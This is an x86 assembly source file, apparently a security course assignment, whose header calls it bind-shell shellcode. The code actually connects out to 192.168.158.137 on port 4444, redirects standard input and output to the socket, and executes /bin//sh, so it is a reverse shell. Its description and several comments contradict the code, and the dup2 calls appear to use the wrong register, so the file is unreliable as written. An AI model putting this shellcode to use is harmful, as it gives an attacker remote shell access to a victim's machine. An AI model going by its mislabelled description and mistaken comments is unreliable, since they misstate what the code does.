; Filename: shell_bind_tcp.nasm
; Author: Matthew Spencer
; Description: SLAE Assignment 1. This will create shellcode that will bind a shell to any inbound ip4 address. 

global _start

section .text
_start:

	
	; socketfd = int socket(int domain, int type, int protocol);
	; int socketcall(int call, unsigned long *args);
	xor eax, eax
	xor ebx, ebx		
	push eax		; 0
	push 0x1 		; 1
	push 0x2 		; 2
	mov ecx, esp 		; stack: 2, 1, 0
	mov al, 0x66 		; socketcall
	mov bl, 0x1 		; function: socket
	int 0x80		; eax = socketcall(ebx = 1, ecx = stack);
	pop edi
	xchg edi, eax 		; store socketfd in esi

	; struct sockaddr_in
	xor eax, eax 
	push dword 0x899ea8c0 	; 192.168.158.137 in network byte order
	push word 0x5c11 	; 0x5c11 (htons(4444) = 23569 = 0x5c11)
	push word 0x2		; 2
	mov ecx, esp 		; stack: 2, 0x3950, 192.158.158.137


	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
	; int socketcall(int call, unsigned long *args);
	xor eax, eax
	push 0x10 		; 16
	push ecx		; struct sockaddr_in
	push edi		; socketfd
	mov ecx, esp 		; stack: socketfd, struct sockaddr_in, 16
	mov al, 0x66 		; socketcall
	mov bl, 0x3 		; function: connect
	int 0x80		; eax = socketcall(ebx = 2, ecx = stack);

	
	; int dup2(int oldfd, int newfd);
	mov al, 0x3f 		; dup2
	xor ecx, ecx 		; 0
	int 0x80		; dup2(ebx = clientfd, ecx = 0)

	mov al, 0x3f 		; dup2
	inc cl			; 1
	int 0x80		; dup2(ebx = clientfd, ecx = 1)

	mov al, 0x3f 		; dup2
	inc cl			; 2
	int 0x80		; dup2(ebx = clientfd, ecx = 2)


	; int execve(const char *filename, char *const argv[], char *const envp[]);
	xor eax, eax
	push eax		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f		; "nib/"
	mov ebx, esp 		; stack: "/bin//sh"
	xor ecx, ecx 		; NULL
	xor edx, edx 		; NULL
	mov al, 0x0b 		; execve
	int 0x80 		; execve(ebx = "/bin//sh", ecx = NULL, edx = NULL)
